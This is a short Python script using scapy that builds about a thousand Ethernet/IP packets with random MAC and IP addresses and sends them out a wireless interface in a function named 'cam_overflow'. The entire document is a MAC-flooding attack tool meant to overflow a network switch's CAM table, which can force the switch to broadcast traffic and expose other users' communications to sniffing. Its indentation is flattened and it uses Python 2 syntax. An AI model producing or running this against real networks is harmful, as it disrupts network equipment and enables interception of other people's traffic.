from scapy.all import *

def generate_packets():
packet_list = []
for i in xrange(1,1000):
packet = Ether(src = RandMAC(), dst = RandMAC())/IP(src = RandIP(), dst = RandIP())
packet_list.append(packet)
return packet_list

def cam_overflow(packet_list):
   sendp(packet_list, iface='wlan')

if __name__ == '__main__':
   packet_list = generate_packets()
   cam_overflow(packet_list)
